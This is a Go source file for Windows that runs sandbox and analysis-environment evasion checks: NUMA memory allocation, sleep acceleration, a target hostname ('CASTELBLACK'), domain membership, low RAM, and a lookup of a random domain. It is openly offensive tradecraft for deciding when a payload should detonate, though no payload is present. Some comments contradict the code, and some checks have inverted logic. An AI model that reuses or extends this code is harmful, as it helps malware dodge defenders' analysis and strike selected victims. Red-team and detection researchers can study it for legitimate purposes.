package main

import (
    "syscall"
	"golang.org/x/sys/windows"
    "math/rand"
    "time"
    "unsafe"
    "fmt"
    "net/http"
)

var (
	k32 = windows.NewLazySystemDLL("kernel32.dll")
	netapi32 = windows.NewLazySystemDLL("netapi32.dll")

    VirtualAllocExNuma = k32.NewProc("VirtualAllocExNuma")
    VirtualFreeEx = k32.NewProc("VirtualFreeEx")
	GetCurrentProcess = k32.NewProc("GetCurrentProcess")
	GetComputerName = k32.NewProc("GetComputerNameW")
    GetPhysicallyInstalledSystemMemory = k32.NewProc("GetPhysicallyInstalledSystemMemory")
    NetWkstaGetInfo = netapi32.NewProc("NetWkstaGetInfo")
)

func main() {
    // VAllocExNuma
    b1 := isSandboxedNuma()
    // Sleep skip or not ?
    b2 := isSandboxedSleep()
    // Detonate on hostname
	b3 := isHost("CASTELBLACK")
    // Domain-joined check
	b4 := isDomainJoined() // WORKGROUP
    // Check if ram is less than 1GB
    b5 := checkRam()
    // Check if a random url exist
    b6 := checkUrl()


    // Either one 
    isSandboxed := b1 || b2 || b3 || b4 || b5  || b6 
	fmt.Println(isSandboxed)
}

func isSandboxedNuma() bool {
	pHandle, _, err := GetCurrentProcess.Call()

    _, _,err = VirtualAllocExNuma.Call(
        pHandle,
        0,
        0x1000,
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_EXECUTE_READ,
        0)

    if err != nil && err.Error() != "The operation completed successfully."{
        return true
    }
    return false
}

func isSandboxedSleep() bool {
    rand.Seed(time.Now().UnixNano())
    sleepTime := rand.Intn(10000-5000) + 5000
    margin := sleepTime - 500
    before := time.Now()
    time.Sleep(time.Duration(sleepTime) * time.Millisecond)
    if time.Now().Sub(before).Milliseconds() < int64(margin) {
        return true
    }
    return false
}

func isHost(name string) bool {
	const maxLen = 128
	var buf [maxLen]uint16
	var size uint32 = maxLen
	GetComputerName.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)
	
	machine_name := syscall.UTF16ToString(buf[:])
	fmt.Println(machine_name)
    return (machine_name != name)
}

func isDomainJoined() bool {
	type WKSTA_INFO_100 struct {
		Wki100_platform_id  uint32
		Wki100_computername *uint16
		Wki100_langroup     *uint16
		Wki100_ver_major    uint32
		Wki100_ver_minor    uint32
	}

	var dataPointer uintptr
	NetWkstaGetInfo.Call(
		uintptr(0),
		uintptr(uint32(100)), // WKSTA_INFO_100
		uintptr(unsafe.Pointer(&dataPointer)),
	)
	var data = (*WKSTA_INFO_100)(unsafe.Pointer(dataPointer))
	domain_name := syscall.UTF16ToString((*[4096]uint16)(unsafe.Pointer(data.Wki100_langroup))[:])
	fmt.Println(domain_name)
    return (domain_name == "WORKGROUP") // Check if machine is domain-joined
}

// checkRam checks if the system has less than 1GB of ram
func checkRam() bool {
	var mem uint64
	GetPhysicallyInstalledSystemMemory.Call(uintptr(unsafe.Pointer(&mem)))
	// if ram is less than 1GB, return false
	return mem < 1000000
}

// checkUrl checks if a random url exist
func checkUrl() bool {
    letters := []rune("abcdefghijklmnopqrstuvwxyz")
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	b := make([]rune, 8)
	for i := range b {
		b[i] = letters[r1.Intn(len(letters))]
	}
	url := "http://" + string(b) + ".com"
	_, err := http.Get(url)
	if err == nil {
		// if the url exists, return true
		return true
	}
	return false
}

